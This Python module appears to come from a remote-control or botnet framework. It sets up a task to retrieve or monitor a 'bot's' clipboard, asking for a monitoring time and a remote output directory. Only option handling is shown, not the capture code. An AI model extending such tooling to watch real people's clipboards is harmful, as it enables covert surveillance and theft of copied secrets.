# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *
import os


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Retrieve or monitor the bot's clipboard.",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Time in seconds to monitor the clipboard (Leave empty for 0): ",
            "Remote output directory (Leave empty to not output to a file): "
        ]

    def setup(self, set_options):
        monitor_time = set_options[0]

        if not monitor_time:
            monitor_time = 0

        if not str(monitor_time).isdigit():
            self._view.display_error("Invalid monitor time (should be in seconds).")
            return False, None
        else:
            output_file = set_options[1]

            return True, {
                "monitor_time": monitor_time,
                "output_file": output_file
            }
